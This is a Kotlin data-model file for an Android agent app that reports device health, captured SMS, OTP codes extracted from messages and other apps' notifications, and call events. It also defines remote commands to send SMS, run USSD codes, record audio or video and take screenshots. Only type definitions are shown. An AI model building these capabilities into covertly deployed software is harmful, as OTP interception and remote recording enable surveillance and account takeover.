package com.routedns.routebot.domain.model

import kotlinx.serialization.SerialName
import kotlinx.serialization.Serializable
import kotlinx.serialization.json.JsonElement

@Serializable
enum class DeviceStatus {
    @SerialName("online") ONLINE,
    @SerialName("offline") OFFLINE,
    @SerialName("disabled") DISABLED
}

@Serializable
data class Device(
    val id: String,
    @SerialName("device_uuid") val deviceUuid: String,
    val name: String,
    val status: DeviceStatus = DeviceStatus.OFFLINE,
    val manufacturer: String = "",
    val model: String = "",
    @SerialName("android_version") val androidVersion: String = "",
    @SerialName("app_version") val appVersion: String = "",
    @SerialName("api_key_prefix") val apiKeyPrefix: String = ""
)

@Serializable
data class DeviceRegistrationRequest(
    @SerialName("device_uuid") val deviceUuid: String,
    val name: String,
    val manufacturer: String,
    val model: String,
    @SerialName("android_version") val androidVersion: String,
    @SerialName("app_version") val appVersion: String,
    val metadata: JsonElement? = null
)

@Serializable
data class DeviceRegistrationResponse(
    val device: Device,
    @SerialName("api_key") val apiKey: String
)

@Serializable
data class LoginRequest(
    val email: String,
    val password: String
)

@Serializable
data class TokenPair(
    @SerialName("access_token") val accessToken: String,
    @SerialName("refresh_token") val refreshToken: String,
    @SerialName("expires_in") val expiresIn: Long = 0
)

@Serializable
data class AuthResponse(
    val tokens: TokenPair
)

@Serializable
data class DeviceHeartbeat(
    @SerialName("battery_level") val batteryLevel: Int? = null,
    @SerialName("is_charging") val isCharging: Boolean? = null,
    @SerialName("storage_free_mb") val storageFreeMb: Long? = null,
    @SerialName("ram_free_mb") val ramFreeMb: Long? = null,
    @SerialName("cpu_usage") val cpuUsage: Double? = null,
    @SerialName("network_type") val networkType: String = "",
    @SerialName("wifi_ssid") val wifiSsid: String = "",
    @SerialName("signal_strength") val signalStrength: Int? = null,
    @SerialName("sim_info") val simInfo: JsonElement? = null,
    val payload: JsonElement? = null,
    @SerialName("reported_at") val reportedAt: String? = null
)

@Serializable
enum class SmsDirection {
    @SerialName("inbound") INBOUND,
    @SerialName("outbound") OUTBOUND
}

@Serializable
data class SmsMessage(
    val direction: SmsDirection,
    val address: String,
    val body: String,
    @SerialName("sim_slot") val simSlot: Int = 0,
    val status: String = "received",
    @SerialName("provider_ref") val providerRef: String? = null
)

@Serializable
enum class OtpSource {
    @SerialName("sms") SMS,
    @SerialName("notification") NOTIFICATION
}

@Serializable
data class OtpEvent(
    val source: OtpSource,
    val sender: String,
    @SerialName("otp_code") val otpCode: String,
    @SerialName("raw_text") val rawText: String,
    val pattern: String
)

@Serializable
data class NotificationEvent(
    @SerialName("package_name") val packageName: String,
    val title: String,
    val text: String,
    val payload: JsonElement? = null,
    @SerialName("posted_at") val postedAt: String? = null
)

@Serializable
enum class CallType {
    @SerialName("incoming") INCOMING,
    @SerialName("outgoing") OUTGOING,
    @SerialName("missed") MISSED
}

@Serializable
data class CallEvent(
    @SerialName("call_type") val callType: CallType,
    val number: String,
    val state: String,
    @SerialName("duration_sec") val durationSec: Int = 0,
    @SerialName("started_at") val startedAt: String? = null
)

@Serializable
data class RemoteCommand(
    val id: String,
    val command: String,
    val payload: JsonElement? = null
)

@Serializable
enum class CommandStatus {
    @SerialName("queued") QUEUED,
    @SerialName("sent") SENT,
    @SerialName("acked") ACKED,
    @SerialName("running") RUNNING,
    @SerialName("succeeded") SUCCEEDED,
    @SerialName("failed") FAILED,
    @SerialName("cancelled") CANCELLED
}

@Serializable
data class CommandAckRequest(
    val status: CommandStatus,
    val result: JsonElement? = null,
    @SerialName("error_message") val errorMessage: String = ""
)

@Serializable
enum class MediaType {
    @SerialName("audio") AUDIO,
    @SerialName("video") VIDEO,
    @SerialName("screenshot") SCREENSHOT
}

@Serializable
data class AgentConfig(
    val serverUrl: String = "",
    val deviceName: String = "",
    val otpPatterns: List<String> = emptyList(),
    val notificationPackages: List<String> = emptyList(),
    val certificatePins: List<String> = emptyList()
)

@Serializable
data class DeviceHealthSnapshot(
    val batteryLevel: Int = -1,
    val isCharging: Boolean = false,
    val storageFreeMb: Long = 0,
    val ramFreeMb: Long = 0,
    val networkType: String = "unknown",
    val wifiSsid: String = "",
    val signalStrength: Int? = null,
    val manufacturer: String = "",
    val model: String = "",
    val androidVersion: String = "",
    val appVersion: String = ""
)

@Serializable
data class QueuedEvent(
    val id: Long = 0,
    val type: String,
    val payload: String,
    val createdAt: Long = System.currentTimeMillis(),
    val retryCount: Int = 0
)

object CommandTypes {
    const val PING = "ping"
    const val SYNC = "sync"
    const val RESTART_SERVICES = "restart_services"
    const val REFRESH_CONFIG = "refresh_config"
    const val CLEAR_CACHE = "clear_cache"
    const val UPDATE_CONFIG = "update_config"
    const val SEND_SMS = "send_sms"
    const val USSD = "ussd"
    const val RECORD_AUDIO = "record_audio"
    const val RECORD_VIDEO = "record_video"
    const val TAKE_SCREENSHOT = "take_screenshot"
}

object EventTypes {
    const val SMS = "sms"
    const val OTP = "otp"
    const val NOTIFICATION = "notification"
    const val CALL = "call"
    const val HEARTBEAT = "heartbeat"
}
